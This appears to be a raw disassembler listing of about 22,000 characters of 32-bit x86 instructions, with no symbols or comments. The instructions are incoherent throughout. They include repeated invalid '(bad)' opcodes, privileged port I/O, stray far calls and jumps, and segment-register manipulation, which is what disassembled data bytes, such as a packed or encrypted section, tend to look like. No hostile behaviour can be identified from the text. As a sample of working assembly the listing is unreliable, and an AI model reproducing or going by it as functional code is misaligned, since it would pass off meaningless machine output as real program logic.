  4238a0:	ud0    ebp,DWORD PTR [edi+0x14]
  4238a4:	test   al,0x1f
  4238a6:	bound  esp,QWORD PTR [ecx-0x72c4286]
  4238ac:	(bad)  
  4238ad:	jp     0x4238e0
  4238af:	adc    ebp,DWORD PTR [edx+0x68]
  4238b2:	fmul   QWORD PTR [ebx+0x5e]
  4238b5:	cmp    eax,0xe12588c4
  4238ba:	sbb    ebp,ebx
  4238bc:	xor    BYTE PTR [ecx+0x5f],ah
  4238bf:	or     eax,DWORD PTR [eax+0x2945f51b]
  4238c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4238c6:	out    dx,al
  4238c7:	jne    0x423874
  4238c9:	scas   eax,DWORD PTR es:[edi]
  4238ca:	adc    al,0x2c
  4238cc:	inc    eax
  4238cd:	mov    ch,0x11
  4238cf:	mov    eax,ds:0x83d3b2ce
  4238d4:	shr    BYTE PTR [edi+edx*8-0x3fecade1],cl
  4238db:	clc    
  4238dc:	xor    ebp,DWORD PTR [edx]
  4238de:	out    dx,al
  4238df:	(bad)
  4238e3:	bnd jl 0x4238ca
  4238e6:	sbb    eax,0x9c36b9a1
  4238eb:	pop    es
  4238ec:	or     al,0x1e
  4238ee:	pop    eax
  4238ef:	push   ecx
  4238f0:	fs mov ah,0x35
  4238f3:	and    edi,0x379f2ec0
  4238f9:	cmp    al,0xe4
  4238fb:	mov    al,ds:0xb0a531db
  423900:	es mov dh,0xe3
  423903:	push   esi
  423904:	pop    esi
  423905:	sbb    al,0x9c
  423907:	pop    ss
  423908:	xchg   edi,eax
  423909:	sbb    eax,0x60c9ed08
  42390e:	mov    ch,0xfb
  423910:	mov    ebp,0xb8a1eb3
  423915:	pop    es
  423916:	out    dx,al
  423917:	loopne 0x42394b
  423919:	cld    
  42391a:	xchg   DWORD PTR [edx+ebx*1-0x5c],eax
  42391e:	and    DWORD PTR [edi+0x1d],ebp
  423921:	popa   
  423922:	add    al,0x79
  423924:	in     eax,0xc1
  423926:	push   cs
  423927:	jmp    0xf830d227
  42392c:	js     0x4239a9
  42392e:	jns    0x4238e0
  423930:	cmp    ch,dl
  423932:	pop    esp
  423933:	mov    eax,ds:0xa2576273
  423938:	(bad)  
  423939:	push   ss
  42393a:	xchg   ecx,eax
  42393b:	ja     0x42398c
  42393d:	icebp  
  42393e:	adc    BYTE PTR [ebx],0x5f
  423941:	dec    esp
  423942:	les    ebx,FWORD PTR [ebp+ecx*2-0xbfeee09]
  423949:	mov    WORD PTR [ebp-0x511a6c5f],es
  42394f:	mov    ds:0x1819c305,eax
  423954:	pop    esi
  423955:	dec    ebp
  423956:	cdq    
  423957:	sbb    BYTE PTR [edx-0x10],0x33
  42395b:	mov    eax,0xe6b4e73
  423960:	cld    
  423961:	pusha  
  423962:	cmp    BYTE PTR [ecx],ah
  423964:	ss clc 
  423966:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423967:	sbb    BYTE PTR [esi-0x7e],0x3d
  42396b:	pop    ebp
  42396c:	mov    bh,BYTE PTR [ecx]
  42396e:	push   ss
  42396f:	stos   BYTE PTR es:[edi],al
  423970:	ins    BYTE PTR es:[edi],dx
  423971:	dec    esi
  423972:	aad    0x9e
  423974:	mov    eax,0xf8a18ff8
  423979:	(bad)  
  42397a:	aas    
  42397b:	pop    ds
  42397c:	js     0x4239ec
  42397e:	dec    ebp
  42397f:	lods   al,BYTE PTR ds:[esi]
  423980:	test   BYTE PTR [esi+esi*4-0x7dd0a179],dh
  423987:	das    
  423988:	push   0xffffffd1
  42398a:	mov    esp,0xfff5eac
  42398f:	shl    BYTE PTR [edx-0x77],cl
  423992:	push   0xffffff9b
  423994:	inc    ecx
  423995:	popa   
  423996:	aad    0xae
  423998:	push   edx
  423999:	push   esi
  42399a:	pop    ecx
  42399b:	imul   esp,DWORD PTR [eax],0x64e4ee6c
  4239a1:	cld    
  4239a2:	jp     0x42398d
  4239a4:	aaa    
  4239a5:	dec    edi
  4239a6:	sub    ah,BYTE PTR [ecx+0x23fd8404]
  4239ac:	inc    esi
  4239ad:	add    eax,esi
  4239af:	inc    ebx
  4239b0:	pop    edi
  4239b1:	inc    ebp
  4239b2:	inc    esp
  4239b3:	and    eax,0x991bf62
  4239b8:	jne    0x4239a3
  4239ba:	add    DWORD PTR [ebx-0x470a9f35],0x515609e2
  4239c4:	fist   DWORD PTR [esi+0x45acf8ee]
  4239ca:	mov    ecx,0x22844e86
  4239cf:	mov    eax,ds:0x81704677
  4239d4:	sub    esi,edx
  4239d6:	push   esi
  4239d7:	neg    BYTE PTR [esi+0x69]
  4239da:	xor    ebx,DWORD PTR ds:0x6987eac7
  4239e0:	pop    ecx
  4239e1:	mov    ah,BYTE PTR cs:[ecx-0x5bbbeb12]
  4239e8:	jle    0x4239ee
  4239ea:	cld    
  4239eb:	aas    
  4239ec:	pop    esi
  4239ed:	sub    eax,0xa681c899
  4239f2:	sahf   
  4239f3:	sbb    DWORD PTR [eax+0x710b4749],ebp
  4239f9:	pop    edi
  4239fa:	jns    0x4239ce
  4239fc:	fwait
  4239fd:	mov    eax,ds:0x4623b159
  423a02:	out    dx,al
  423a03:	stc    
  423a04:	je     0x423a63
  423a06:	fsubr  st,st(0)
  423a08:	jge    0x4239bb
  423a0a:	in     eax,0xa0
  423a0c:	push   ebp
  423a0d:	in     al,dx
  423a0e:	mov    dl,0x8f
  423a10:	mov    ds:0x5d682692,eax
  423a15:	rcr    DWORD PTR [ebp-0x549c7699],cl
  423a1b:	ret    
  423a1c:	call   0x6a61:0x59f7e35c
  423a23:	clc    
  423a24:	mov    dl,0xb
  423a26:	xor    esi,ebp
  423a28:	retf   0xf7d7
  423a2b:	fisttp DWORD PTR [edi+0x76]
  423a2e:	out    dx,al
  423a2f:	fistp  QWORD PTR [ecx+eax*2-0x56]
  423a33:	inc    ecx
  423a34:	and    BYTE PTR [ecx+0x7],ah
  423a37:	les    ebp,FWORD PTR [ecx]
  423a39:	sbb    al,0xa4
  423a3b:	movsx  eax,BYTE PTR ss:[ecx]
  423a3f:	adc    DWORD PTR [eax],esi
  423a41:	pushf  
  423a42:	cs ret 0x8ea8
  423a46:	aaa    
  423a47:	mov    cl,0x8c
  423a49:	push   edx
  423a4a:	cs (bad) 
  423a4c:	std    
  423a4d:	xor    DWORD PTR ds:0x6e241419,ebp
  423a53:	sub    edx,0x5b8bee11
  423a59:	in     al,0xa3
  423a5b:	add    edx,ecx
  423a5d:	fbld   TBYTE PTR [eax]
  423a5f:	jae    0x423a57
  423a61:	inc    edx
  423a62:	ds es xchg edi,eax
  423a65:	add    BYTE PTR [edi-0x541f85b0],0xf3
  423a6c:	std    
  423a6d:	mov    ds:0x335ec049,al
  423a72:	out    0x60,al
  423a74:	lahf   
  423a75:	in     al,dx
  423a76:	push   ebp
  423a77:	ins    DWORD PTR es:[edi],dx
  423a78:	jge    0x423ada
  423a7a:	in     al,0x53
  423a7c:	cmp    cl,BYTE PTR [esi-0x47]
  423a7f:	scas   al,BYTE PTR es:[edi]
  423a80:	aas    
  423a81:	xchg   ecx,eax
  423a82:	in     al,0xa3
  423a84:	pop    esi
  423a85:	stc    
  423a86:	pop    es
  423a87:	outs   dx,DWORD PTR ds:[esi]
  423a88:	das    
  423a89:	inc    ebp
  423a8a:	add    esp,DWORD PTR [ecx-0x7]
  423a8d:	pusha  
  423a8e:	push   ds
  423a8f:	scas   al,BYTE PTR es:[edi]
  423a90:	sbb    eax,0xaa2695c3
  423a95:	shl    DWORD PTR [esp+eax*4+0x52],cl
  423a99:	inc    ecx
  423a9a:	cld    
  423a9b:	push   esi
  423a9c:	fstp   TBYTE PTR [esi-0x41]
  423a9f:	adc    ecx,esi
  423aa1:	fnstenv [ebp+0x1e6130b7]
  423aa7:	(bad)
  423aab:	jp     0x423a31
  423aad:	mov    ch,dh
  423aaf:	inc    ebx
  423ab0:	add    al,0xde
  423ab2:	pop    ebp
  423ab3:	mov    ss,esi
  423ab5:	adc    eax,0xa0b3a153
  423aba:	mov    ds:0xe8f8d868,eax
  423abf:	push   edi
  423ac0:	pop    ebx
  423ac1:	jae    0x423ac6
  423ac3:	jbe    0x423aa5
  423ac5:	jo     0x423b15
  423ac7:	inc    ecx
  423ac8:	test   BYTE PTR [ebx+0x5a],al
  423acb:	mov    eax,ds:0xbdac065a
  423ad0:	pop    esp
  423ad1:	loop   0x423a71
  423ad3:	and    bh,BYTE PTR [esi+0x3f]
  423ad6:	out    dx,al
  423ad7:	ficom  WORD PTR [ebx+0x33ac40f5]
  423add:	pop    ebp
  423ade:	pop    eax
  423adf:	mov    eax,ds:0x7c524817
  423ae4:	hlt    
  423ae5:	stc    
  423ae6:	mov    edi,0x2368f1c4
  423aeb:	aaa    
  423aec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423aed:	pop    edi
  423aee:	and    ecx,esi
  423af0:	clc    
  423af1:	jns    0x423aaf
  423af3:	push   edx
  423af4:	call   0x343f:0x4c8f4040
  423afb:	call   0xf4a120ef
  423b00:	neg    BYTE PTR [ebx+0x1d39c5a6]
  423b06:	jle    0x423ab8
  423b08:	cmp    al,0x5
  423b0a:	sbb    BYTE PTR [ebx-0xba0d5a3],0xf7
  423b11:	in     eax,dx
  423b12:	push   cs
  423b13:	sbb    eax,0xa92ebe8b
  423b18:	mov    ds:0xa05f6e4b,al
  423b1d:	fisttp WORD PTR [ebp-0x34]
  423b20:	xchg   ebp,eax
  423b21:	sbb    eax,esi
  423b23:	lea    ebp,[edi]
  423b25:	mov    ?,WORD PTR [esi+0x61f16000]
  423b2b:	pop    esi
  423b2c:	add    BYTE PTR [ebx+0x1e],al
  423b2f:	mov    bl,0xf0
  423b31:	push   ecx
  423b32:	out    dx,eax
  423b33:	dec    ebp
  423b34:	sahf   
  423b35:	retf   
  423b36:	sub    ebp,ecx
  423b38:	and    DWORD PTR [edi-0x1c8d9412],edx
  423b3e:	push   0x57
  423b40:	js     0x423b7b
  423b42:	mov    eax,ds:0xbbbb74fe
  423b48:	outs   dx,DWORD PTR ds:[esi]
  423b49:	mov    ah,0xc3
  423b4b:	and    BYTE PTR [eax+ecx*4+0x42],ah
  423b4f:	sahf   
  423b50:	les    esp,FWORD PTR [eax-0x1d]
  423b53:	test   al,0x2d
  423b55:	inc    edi
  423b56:	stc    
  423b57:	mov    al,ds:0xa205a3a0
  423b5c:	add    DWORD PTR [edx+0x48],edx
  423b5f:	sub    al,0x5e
  423b61:	shl    BYTE PTR [ebx+edx*1-0x10],1
  423b65:	leave  
  423b66:	adc    edi,DWORD PTR [esi-0x4b]
  423b69:	pusha  
  423b6a:	in     al,dx
  423b6b:	aam    0x9
  423b6d:	add    ch,dl
  423b6f:	jle    0x423b3d
  423b71:	sbb    eax,0x491e2aee
  423b76:	and    DWORD PTR [edi-0x7e],ecx
  423b79:	pop    ds
  423b7a:	and    al,BYTE PTR [ebx+0x7408613b]
  423b80:	push   edx
  423b81:	leave  
  423b82:	dec    ebp
  423b83:	cld    
  423b84:	mov    ds:0x5112fb10,al
  423b89:	pusha  
  423b8a:	out    0xe1,eax
  423b8c:	adc    DWORD PTR [ecx],ebp
  423b8e:	into   
  423b8f:	push   0xacdb8534
  423b94:	(bad)  [esi+ebp*8]
  423b97:	adc    al,0xe8
  423b99:	mov    ch,0x9c
  423b9b:	test   al,0x9a
  423b9d:	mov    edi,0x23b520ee
  423ba2:	adc    DWORD PTR ds:0xa888810d,eax
  423ba8:	jl     0x423bc7
  423baa:	mov    cl,0xd7
  423bac:	pop    DWORD PTR [eax+0x2f]
  423baf:	in     eax,0x2f
  423bb1:	gs out dx,al
  423bb3:	in     eax,0x95
  423bb5:	and    al,ch
  423bb7:	mov    ch,0x57
  423bb9:	sar    DWORD PTR [ecx+eiz*4],0x74
  423bbd:	ds mov dl,0x36
  423bc0:	fstp   st(5)
  423bc2:	mov    bl,0x1f
  423bc4:	jle    0x423b6e
  423bc6:	in     eax,dx
  423bc7:	imul   ecx,edx,0xfffffff2
  423bca:	or     esi,DWORD PTR [edx-0x61c58ddc]
  423bd0:	sbb    BYTE PTR [ecx-0x7d],ah
  423bd3:	fxch   st(5)
  423bd5:	lods   eax,DWORD PTR ss:[esi]
  423bd7:	(bad)  
  423bd8:	call   0x25e0:0xf63b088a
  423bdf:	mov    eax,ds:0xf1aa51ba
  423be4:	dec    edi
  423be5:	es cwde 
  423be7:	mov    eax,ds:0x22da46df
  423bec:	sub    DWORD PTR [ebx+0x1b],ebp
  423bef:	inc    edx
  423bf0:	in     al,dx
  423bf1:	xchg   esi,eax
  423bf2:	out    dx,al
  423bf3:	outs   dx,BYTE PTR ds:[esi]
  423bf4:	pop    esp
  423bf5:	loope  0x423c26
  423bf7:	cs push eax
  423bf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423bfa:	sbb    dh,BYTE PTR [ecx-0x6c]
  423bfd:	push   es
  423bfe:	jo     0x423c71
  423c00:	and    dh,bh
  423c02:	in     al,dx
  423c03:	inc    edx
  423c04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423c05:	xchg   BYTE PTR [edx],ch
  423c07:	ret    
  423c08:	repnz loopne 0x423ba8
  423c0b:	push   esp
  423c0c:	mov    ecx,0xbaa108d3
  423c11:	lods   al,BYTE PTR ds:[esi]
  423c12:	popa   
  423c13:	adc    cl,0xd0
  423c16:	sbb    ecx,edi
  423c18:	pop    ebp
  423c19:	popf   
  423c1a:	aaa    
  423c1b:	mov    edi,ss
  423c1d:	dec    edi
  423c1e:	fdivrp st(6),st
  423c20:	jb     0x423bdb
  423c22:	das    
  423c23:	jmp    0xce10:0xf2066126
  423c2a:	repz ret 
  423c2c:	or     al,0x90
  423c2e:	pop    esp
  423c2f:	dec    ebp
  423c30:	pop    edi
  423c31:	(bad)  
  423c32:	sbb    DWORD PTR [esi+0x78cda13c],ebx
  423c38:	cmp    BYTE PTR [eax],al
  423c3a:	add    bh,BYTE PTR [ebx+0x3a]
  423c3d:	inc    ebx
  423c3e:	pop    esp
  423c3f:	xor    dl,BYTE PTR [ebp-0x5f]
  423c42:	sbb    esi,DWORD PTR [ebx+eax*8]
  423c45:	out    dx,al
  423c46:	aad    0x43
  423c48:	(bad)  
  423c49:	repnz out dx,al
  423c4b:	mov    eax,DWORD PTR [ecx+eax*1+0x8]
  423c4f:	test   eax,0xefdb5efd
  423c54:	mov    ch,0x60
  423c56:	sbb    edi,0xdac64aee
  423c5c:	and    eax,0x7d5f2215
  423c61:	cwde   
  423c62:	cmp    al,0xa1
  423c64:	stos   BYTE PTR es:[edi],al
  423c65:	(bad)  
  423c66:	sub    eax,0xa4d2a97b
  423c6b:	mov    eax,ds:0xfb0dfcac
  423c70:	test   al,0x18
  423c72:	fsubr  QWORD PTR [edi-0xd]
  423c75:	call   0x417c2064
  423c7a:	add    bh,BYTE PTR [ebp-0x22]
  423c7d:	pushf  
  423c7e:	pusha  
  423c7f:	mov    edx,0xe29d5453
  423c84:	(bad)  
  423c85:	mov    edx,0x20be6c18
  423c8a:	cmp    al,0xcf
  423c8c:	pop    esi
  423c8d:	dec    ebx
  423c8e:	gs pop esp
  423c90:	or     al,0x1d
  423c92:	xor    eax,0xf366c15d
  423c97:	lahf   
  423c98:	arpl   WORD PTR [ebx+0x7e],bp
  423c9b:	test   esi,ebx
  423c9d:	fild   WORD PTR [ecx-0x115eba1d]
  423ca3:	push   edi
  423ca4:	mov    edx,0x945686ea
  423ca9:	cmc    
  423caa:	push   esp
  423cab:	imul   eax,eax,0x25
  423cae:	stc    
  423caf:	mov    al,ds:0x52d53951
  423cb4:	mov    ch,0xed
  423cb6:	xor    ebx,DWORD PTR [esi+0x5e]
  423cb9:	inc    edi
  423cba:	pop    ecx
  423cbb:	js     0x423d1f
  423cbd:	aaa    
  423cbe:	xor    BYTE PTR [ebx+0x40],bh
  423cc1:	popa   
  423cc2:	jo     0x423c4a
  423cc4:	inc    ebp
  423cc5:	ss nop
  423cc7:	add    al,0x80
  423cc9:	loope  0x423d27
  423ccb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ccc:	pop    esi
  423ccd:	sbb    ch,ch
  423ccf:	aad    0x5b
  423cd1:	or     cl,BYTE PTR cs:[edx+0xbc96150]
  423cd8:	call   0x4ca99721
  423cdd:	and    bl,ch
  423cdf:	sub    edx,edx
  423ce1:	dec    ebp
  423ce2:	or     DWORD PTR [edi+eiz*2+0x90571d9],edi
  423ce9:	popa   
  423cea:	mov    ebx,0x6794e058
  423cef:	fucomi st,st(0)
  423cf1:	mov    esp,0x2f1590ee
  423cf6:	outs   dx,BYTE PTR ds:[esi]
  423cf7:	sbb    al,0xc3
  423cf9:	jmp    DWORD PTR [eax-0x79]
  423cfc:	dec    ebx
  423cfd:	popa   
  423cfe:	stc    
  423cff:	arpl   WORD PTR [edi],ax
  423d01:	add    eax,ecx
  423d03:	pop    ebp
  423d04:	fmul   DWORD PTR [ecx]
  423d06:	out    dx,al
  423d07:	mov    al,0xa2
  423d09:	cwde   
  423d0a:	push   edx
  423d0b:	adc    BYTE PTR [eax],cl
  423d0d:	int3   
  423d0e:	sub    al,0x9f
  423d10:	pusha  
  423d11:	std    
  423d12:	pop    es
  423d13:	cmp    BYTE PTR [esi+0x2f],bh
  423d16:	fbld   TBYTE PTR [ebp+0x76]
  423d19:	jge    0x423d09
  423d1b:	dec    edi
  423d1c:	and    BYTE PTR [esi-0x5c],cl
  423d1f:	cmp    eax,0xa14c5574
  423d24:	inc    esp
  423d25:	pop    esp
  423d26:	out    0xc4,al
  423d28:	push   edi
  423d29:	addr16 adc ch,dh
  423d2c:	pop    ebp
  423d2d:	xor    al,0x8b
  423d2f:	stc    
  423d30:	lahf   
  423d31:	sub    eax,0xde7e23fe
  423d36:	sub    DWORD PTR [ecx-0x43808480],esp
  423d3c:	push   ds
  423d3d:	cdq    
  423d3e:	sub    eax,0x2f7f5ecd
  423d43:	jp     0x423d90
  423d45:	enter  0xf28b,0x26
  423d49:	pop    edi
  423d4a:	push   es
  423d4b:	inc    edi
  423d4c:	jecxz  0x423d6d
  423d4e:	inc    eax
  423d4f:	imul   edi,edi,0x41264e4f
  423d55:	js     0x423d45
  423d57:	sahf   
  423d58:	or     edx,DWORD PTR [ecx+ebp*1]
  423d5b:	in     al,0x9b
  423d5d:	cli    
  423d5e:	add    BYTE PTR [ecx+0x616d48a7],ah
  423d64:	xchg   ecx,eax
  423d65:	lahf   
  423d66:	jnp    0x423d85
  423d68:	pop    esi
  423d69:	and    al,0x67
  423d6b:	lea    esp,[edx]
  423d6d:	add    al,0x8c
  423d6f:	xor    bl,dl
  423d71:	pop    edi
  423d72:	xor    BYTE PTR [edi+0x3e09b645],0x7b
  423d79:	pushf  
  423d7a:	(bad)  
  423d7b:	sub    eax,0x51fc795e
  423d80:	scas   al,BYTE PTR es:[edi]
  423d81:	icebp  
  423d82:	retf   0x56e7
  423d85:	mov    bh,0x69
  423d87:	or     edi,ebx
  423d89:	pusha  
  423d8a:	xchg   ecx,eax
  423d8c:	mov    eax,0x26374f3d
  423d91:	mov    al,0xee
  423d93:	nop
  423d94:	out    dx,eax
  423d95:	cld    
  423d96:	dec    esp
  423d97:	mov    BYTE PTR [ecx+eiz*4-0x7abc5ee9],dl
  423d9e:	cli    
  423d9f:	retf   
  423da0:	js     0x423e20
  423da2:	and    eax,0x93df5ead
  423da7:	push   esi
  423da8:	icebp  
  423da9:	or     ecx,DWORD PTR [ecx-0x289ef09c]
  423daf:	ins    DWORD PTR es:[edi],dx
  423db0:	aad    0x9a
  423db2:	(bad)  
  423db4:	dec    ebp
  423db5:	test   esi,ebx
  423db7:	imul   ebx,DWORD PTR [esi+0x3d],0x7e
  423dbb:	or     esi,DWORD PTR [eax]
  423dbd:	pop    ebp
  423dbe:	mov    ecx,0x76615500
  423dc3:	mov    ecx,0x26709257
  423dc8:	mov    ?,ecx
  423dca:	out    dx,eax
  423dcb:	js     0x423e40
  423dcd:	mov    ah,dh
  423dcf:	iret   
  423dd0:	(bad)  [ecx-0x6571c6be]
  423dd6:	xor    ebx,DWORD PTR [ecx]
  423dd8:	repz pusha 
  423dda:	idiv   BYTE PTR [edx+ebx*1-0x2]
  423dde:	or     eax,0x5a5fe358
  423de3:	mov    ds:0x1db12a5e,eax
  423de8:	sub    eax,0x4e78564c
  423ded:	pop    esi
  423dee:	pusha  
  423def:	cli    
  423df0:	mov    cl,0xfb
  423df2:	cdq    
  423df3:	retf   0xc2f4
  423df6:	lock mov ds:0xa3c1959e,al
  423dfc:	gs call 0x5948ec6
  423e02:	inc    ebx
  423e03:	mov    eax,ds:0xe46ebda0
  423e08:	sbb    al,0x9b
  423e0a:	and    DWORD PTR [ecx-0x5df99a2],esi
  423e10:	pop    ebp
  423e11:	icebp  
  423e12:	scas   al,BYTE PTR es:[edi]
  423e13:	iret   
  423e14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e15:	pop    ebp
  423e16:	test   ebx,0x327d6bfe
  423e1c:	outs   dx,DWORD PTR ds:[esi]
  423e1d:	stos   BYTE PTR es:[edi],al
  423e1e:	outs   dx,BYTE PTR ds:[esi]
  423e1f:	out    dx,al
  423e20:	pop    eax
  423e21:	sti    
  423e22:	out    dx,al
  423e23:	push   es
  423e24:	xor    dh,dl
  423e26:	push   ebp
  423e27:	mov    bh,0x15
  423e29:	shr    DWORD PTR [eax],1
  423e2b:	sub    edx,ebp
  423e2d:	pusha  
  423e2e:	fimul  DWORD PTR [eax+ecx*8-0x44b48679]
  423e35:	dec    esi
  423e36:	out    0xa9,eax
  423e38:	sti    
  423e39:	(bad)  
  423e3a:	retf   
  423e3b:	fisubr WORD PTR [ebx-0x46f191a3]
  423e41:	sub    DWORD PTR ds:0x6b20faa8,edi
  423e47:	pop    es
  423e48:	mov    esp,0x5eeaa0b4
  423e4d:	mov    edx,0x57495aba
  423e52:	xchg   ebp,eax
  423e53:	mov    ds:0x1637606f,al
  423e58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e59:	pop    edx
  423e5a:	test   BYTE PTR [edi-0x6b1131b2],cl
  423e60:	jmp    0x7ad01284
  423e65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e66:	mov    esp,DWORD PTR [ecx-0x6c732f66]
  423e6c:	push   edx
  423e6d:	xchg   edx,eax
  423e6e:	mov    ah,0x96
  423e70:	pop    ebx
  423e71:	xchg   ebx,eax
  423e72:	js     0x423e53
  423e74:	es test esi,ebp
  423e77:	sub    DWORD PTR [ebp+eax*8+0x47e8a117],ebx
  423e7e:	jns    0x423ef1
  423e80:	scas   eax,DWORD PTR es:[edi]
  423e81:	push   eax
  423e82:	shl    DWORD PTR [esi],1
  423e84:	pop    esi
  423e85:	psllw  mm5,QWORD PTR [ebx]
  423e88:	loopne 0x423ed6
  423e8a:	ja     0x423e91
  423e8c:	dec    eax
  423e8d:	pop    edx
  423e8e:	dec    edx
  423e8f:	or     BYTE PTR [ebx+ecx*4],cl
  423e92:	jnp    0x423f05
  423e94:	dec    esi
  423e95:	adc    BYTE PTR [eax+eiz*1-0x7711f30d],bh
  423e9c:	xlat   BYTE PTR ds:[ebx]
  423e9d:	ret    0xe37e
  423ea0:	mov    cl,0x46
  423ea2:	xchg   ebx,eax
  423ea3:	mov    eax,ds:0x935c372
  423ea8:	enter  0x253b,0x4b
  423eac:	pop    esi
  423ead:	loopne 0x423f13
  423eaf:	ja     0x423ee8
  423eb1:	mov    eax,0xa5363e24
  423eb6:	mov    edx,0x379c19a0
  423ebb:	and    DWORD PTR [ebx+0x5f],ebp
  423ebe:	ret    
  423ebf:	pop    esp
  423ec0:	pop    esi
  423ec1:	popf   
  423ec2:	push   ecx
  423ec3:	aaa    
  423ec4:	stos   DWORD PTR es:[edi],eax
  423ec5:	mov    ebp,0x5d76bc81
  423eca:	imul   ebp,DWORD PTR [esi-0x7b],0x46
  423ece:	cmc    
  423ecf:	inc    ebx
  423ed0:	into   
  423ed1:	out    0x94,al
  423ed3:	imul   ebx,DWORD PTR [esi-0xc],0x78
  423ed7:	pusha  
  423ed8:	jge    0x423eeb
  423eda:	inc    esi
  423edb:	xchg   ebx,eax
  423edc:	mov    bh,0x59
  423ede:	sar    BYTE PTR [ebx+0x3119304a],cl
  423ee4:	xor    al,0xe4
  423ee6:	xchg   ebx,eax
  423ee7:	adc    esi,DWORD PTR ds:0x4da82a5e
  423eed:	xor    ch,BYTE PTR [esi+0x6f]
  423ef0:	dec    ebp
  423ef1:	addr16 mov cl,0xa8
  423ef5:	mov    al,ds:0x611978d9
  423efa:	adc    bh,cl
  423efc:	sti    
  423efd:	lock fidivr WORD PTR [ecx]
  423f00:	xchg   edi,eax
  423f01:	(bad)  
  423f02:	out    dx,al
  423f03:	int3   
  423f04:	bnd jnp 0x423f36
  423f07:	xchg   ch,bh
  423f09:	popf   
  423f0a:	jne    0x423ead
  423f0c:	das    
  423f0d:	dec    esp
  423f0e:	stos   BYTE PTR es:[edi],al
  423f0f:	inc    eax
  423f10:	jmp    0x423f1b
  423f12:	std    
  423f13:	and    DWORD PTR [esi-0x16],ebx
  423f16:	pop    ecx
  423f17:	loopne 0x423f5c
  423f19:	leave  
  423f1a:	fcom   st(1)
  423f1c:	ins    DWORD PTR es:[edi],dx
  423f1d:	lods   eax,DWORD PTR es:[esi]
  423f1f:	mov    al,ds:0x5fc7820a
  423f24:	or     ebx,ecx
  423f26:	mov    ecx,0x96595bde
  423f2b:	das    
  423f2c:	mov    eax,ds:0x3a4b0e0e
  423f31:	add    ch,bh
  423f33:	mov    ds:0xb5639094,al
  423f38:	sbb    al,0xea
  423f3a:	fisttp QWORD PTR cs:[esi]
  423f3d:	sbb    eax,0x97eae8ee
  423f42:	or     al,0x98
  423f44:	inc    edi
  423f45:	out    dx,al
  423f46:	pushf  
  423f47:	mov    eax,ds:0xf22aa14f
  423f4c:	cs adc al,0x36
  423f4f:	adc    bl,BYTE PTR [esi+0x46]
  423f52:	push   0x6c5a1b40
  423f57:	add    DWORD PTR [edi],0x42
  423f5a:	mov    ch,0x2c
  423f5c:	mov    dh,0xe0
  423f5e:	or     eax,DWORD PTR [edi]
  423f60:	push   ecx
  423f61:	xor    DWORD PTR [edx+ebx*1-0x3e22c892],esp
  423f68:	xor    al,0x40
  423f6a:	shl    DWORD PTR [eax+0x7e23d1e1],cl
  423f70:	ins    BYTE PTR es:[edi],dx
  423f71:	cmc    
  423f72:	pop    edi
  423f73:	scas   eax,DWORD PTR es:[edi]
  423f74:	ror    BYTE PTR [ecx-0x12],0x3e
  423f78:	call   0xeead:0xd82e2794
  423f7f:	imul   esi,DWORD PTR [ebp+edx*2-0xa18c862],0xffffff97
  423f87:	icebp  
  423f88:	outs   dx,BYTE PTR ds:[esi]
  423f89:	pusha  
  423f8a:	sbb    dl,dl
  423f8c:	xchg   ebp,eax
  423f8d:	inc    ebx
  423f8e:	or     BYTE PTR [ecx+0x7a],bh
  423f91:	nop
  423f92:	out    dx,al
  423f93:	adc    edx,eax
  423f95:	ins    DWORD PTR es:[edi],dx
  423f96:	fdiv   st(3),st
  423f98:	or     al,0x26
  423f9a:	mov    ebx,0xfb4a5a3
  423f9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423fa0:	lods   eax,DWORD PTR ds:[esi]
  423fa1:	lds    eax,FWORD PTR [esi-0x4981db8f]
  423fa7:	mov    bh,BYTE PTR [esi]
  423fa9:	popa   
  423faa:	cdq    
  423fab:	jp     0x423fef
  423fad:	inc    esp
  423fae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423faf:	inc    esi
  423fb0:	dec    ebp
  423fb1:	popa   
  423fb2:	pop    ds
  423fb3:	loope  0x423f67
  423fb5:	cli    
  423fb6:	popf   
  423fb7:	clc    
  423fb8:	jle    0x423fde
  423fba:	div    edx
  423fbc:	inc    ecx
  423fbd:	xor    dh,ch
  423fbf:	scas   eax,DWORD PTR es:[edi]
  423fc0:	fsub   DWORD PTR [edx-0x5c]
  423fc3:	sbb    BYTE PTR [ecx+0xafb7060],0xa0
  423fca:	scas   eax,DWORD PTR es:[edi]
  423fcb:	test   BYTE PTR [eax],bh
  423fcd:	je     0x423fbd
  423fcf:	sbb    BYTE PTR [eax-0x6a93b9a8],0xd0
  423fd6:	pop    eax
  423fd7:	nop
  423fd8:	fwait
  423fd9:	lods   eax,DWORD PTR ds:[esi]
  423fda:	popa   
  423fdb:	mov    ds:0x501967b9,eax
  423fe0:	(bad)  
  423fe1:	xor    BYTE PTR [ebp+0x9],ah
  423fe4:	in     al,dx
  423fe5:	js     0x423fd5
  423fe7:	xor    DWORD PTR [eax+0x2c],eax
  423fea:	sub    eax,0x3950a2ec
  423fef:	mov    eax,ds:0xd33c4232
  423ff4:	test   DWORD PTR [esi],eax
  423ff6:	add    dh,BYTE PTR [edi+0x32f4ac5e]
  423ffc:	pop    eax
  423ffd:	sbb    bh,BYTE PTR ss:[ebp+0x1e456129]
  424004:	adc    dl,bh
  424006:	adc    eax,0x56fc85f4
  42400b:	je     0x42406b
  42400d:	dec    edx
  42400e:	adc    al,al
  424010:	aad    0xce
  424012:	cmp    BYTE PTR [edx-0x34],al
  424015:	pusha  
  424016:	or     esp,DWORD PTR [ebx-0x51]
  424019:	ins    DWORD PTR es:[edi],dx
  42401a:	mov    dl,0x7e
  42401c:	cwde   
  42401d:	lock dec esi
  42401f:	sbb    DWORD PTR [edx-0x1d],eax
  424022:	xchg   ebx,eax
  424023:	int3   
  424024:	pop    esi
  424025:	ds xchg ebp,eax
  424027:	push   cs
  424028:	dec    ecx
  424029:	push   es
  42402a:	loop   0x423fcd
  42402c:	and    BYTE PTR [ebx+0x2c],dh
